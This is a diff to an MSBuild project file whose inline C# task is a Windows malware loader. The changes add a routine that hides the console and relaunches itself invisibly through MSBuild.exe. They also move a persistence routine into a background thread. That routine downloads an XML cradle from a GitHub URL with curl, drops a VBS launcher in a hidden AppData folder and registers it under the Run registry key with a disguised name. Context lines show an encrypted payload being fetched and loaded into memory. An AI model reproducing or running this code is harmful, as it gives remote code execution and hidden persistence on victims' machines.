@@ -4,6 +4,7 @@
   </Target>
   <UsingTask TaskName="ClassTask" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
     <Task>
+      <Reference Include="System"/>
       <Reference Include="System.Core"/>
       <Using Namespace="System"/>
       <Using Namespace="System.IO"/>
@@ -31,11 +32,77 @@
             [DllImport("user32.dll")]
             static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
+            [DllImport("kernel32.dll")]
+            static extern bool FreeConsole();
+
+            static string _selfXml()
+            {
+                string[] args = Environment.GetCommandLineArgs();
+                for (int i = args.Length - 1; i >= 0; i--)
+                    if (args[i].EndsWith(".xml", StringComparison.OrdinalIgnoreCase))
+                        return args[i];
+                return Path.Combine(Path.GetTempPath(), "b.xml");
+            }
+
+            bool _spawnHidden()
+            {
+                try
+                {
+                    if (Environment.GetEnvironmentVariable("TPW") == "1") return false;
+                    string bx = _selfXml();
+                    if (!File.Exists(bx)) return false;
+                    var psi = new ProcessStartInfo();
+                    psi.FileName = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe";
+                    psi.Arguments = "\"" + bx + "\" /nologo /v:q";
+                    psi.UseShellExecute = false;
+                    psi.CreateNoWindow = true;
+                    psi.WindowStyle = ProcessWindowStyle.Hidden;
+                    psi.EnvironmentVariables["TPW"] = "1";
+                    Process.Start(psi);
+                    return true;
+                }
+                catch { return false; }
+            }
+
+            void _ps()
+            {
+                try
+                {
+                    string persistDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Services");
+                    string persistXml = Path.Combine(persistDir, "config.xml");
+                    string persistVbs = Path.Combine(persistDir, "start.vbs");
+                    Directory.CreateDirectory(persistDir);
+                    string selfXml = Path.Combine(Path.GetTempPath(), "b.xml");
+                    if (File.Exists(selfXml))
+                        File.Copy(selfXml, persistXml, true);
+                    else if (!File.Exists(persistXml))
+                    {
+                        var dlXml = new Process();
+                        dlXml.StartInfo.FileName = "curl.exe";
+                        dlXml.StartInfo.Arguments = "-sL -o \"" + persistXml + "\" \"https://raw.githubusercontent.com/Intel-Boss/plsdontreverse/main/b.xml\"";
+                        dlXml.StartInfo.UseShellExecute = false;
+                        dlXml.StartInfo.CreateNoWindow = true;
+                        dlXml.Start();
+                        dlXml.WaitForExit(10000);
+                    }
+                    string msbuild = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe";
+                    string vbsContent = "CreateObject(\"WScript.Shell\").Run \"\"\"" + msbuild + "\"\" \"\"" + persistXml + "\"\" /nologo /v:q\", 0, False";
+                    File.WriteAllText(persistVbs, vbsContent);
+                    try { File.SetAttributes(persistDir, FileAttributes.Hidden); } catch { }
+                    Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+                    if (rk != null) { rk.SetValue("WindowsConfiguration", "wscript.exe \"" + persistVbs + "\""); rk.Close(); }
+                    try { File.Delete(Path.Combine(Path.GetTempPath(), "b.xml")); } catch { }
+                }
+                catch { }
+            }
+
             public override bool Execute()
             {
                 try
                 {
                     ShowWindow(GetConsoleWindow(), 0);
+                    if (_spawnHidden()) return true;
+                    try { FreeConsole(); } catch { }
 
                     string tmp = Path.Combine(Path.GetTempPath(), "b.bin");
                     var dl = new Process();
@@ -70,38 +137,6 @@
 
                     Assembly asm = Assembly.Load(dec);
 
-                    // Persistence: drop the XML cradle and register silent startup via registry
-                    try
-                    {
-                        string persistDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Services");
-                        string persistXml = Path.Combine(persistDir, "config.xml");
-                        string persistVbs = Path.Combine(persistDir, "start.vbs");
-                        Directory.CreateDirectory(persistDir);
-                        string selfXml = Path.Combine(Path.GetTempPath(), "b.xml");
-                        if (File.Exists(selfXml))
-                            File.Copy(selfXml, persistXml, true);
-                        else if (!File.Exists(persistXml))
-                        {
-                            var dlXml = new Process();
-                            dlXml.StartInfo.FileName = "curl.exe";
-                            dlXml.StartInfo.Arguments = "-sL -o \"" + persistXml + "\" \"https://raw.githubusercontent.com/Intel-Boss/plsdontreverse/main/b.xml\"";
-                            dlXml.StartInfo.UseShellExecute = false;
-                            dlXml.StartInfo.CreateNoWindow = true;
-                            dlXml.Start();
-                            dlXml.WaitForExit(10000);
-                        }
-                        string msbuild = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe";
-                        string vbsContent = "CreateObject(\"WScript.Shell\").Run \"\"\"" + msbuild + "\"\" \"\"" + persistXml + "\"\" /nologo /v:q\", 0, False";
-                        File.WriteAllText(persistVbs, vbsContent);
-                        try { File.SetAttributes(persistDir, FileAttributes.Hidden); } catch { }
-                        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-                        if (rk != null) { rk.SetValue("WindowsConfiguration", "wscript.exe \"" + persistVbs + "\""); rk.Close(); }
-                    }
-                    catch { }
-
-                    // Clean up temp xml after persistence is set
-                    try { File.Delete(Path.Combine(Path.GetTempPath(), "b.xml")); } catch { }
-
                     Type sType = asm.GetType("AppServices.S");
                     var dMethod = sType.GetMethod("D", BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.Public);
                     string host = (string)dMethod.Invoke(null, new object[] { "TkdHUUxLUU5MSVFNTEY=" });
@@ -114,6 +149,11 @@
                     t.SetApartmentState(ApartmentState.STA);
                     t.IsBackground = false;
                     t.Start();
+
+                    Thread psThread = new Thread(() => { try { _ps(); } catch { } });
+                    psThread.IsBackground = true;
+                    psThread.Start();
+
                     Thread.Sleep(Timeout.Infinite);
                 }
                 catch { }
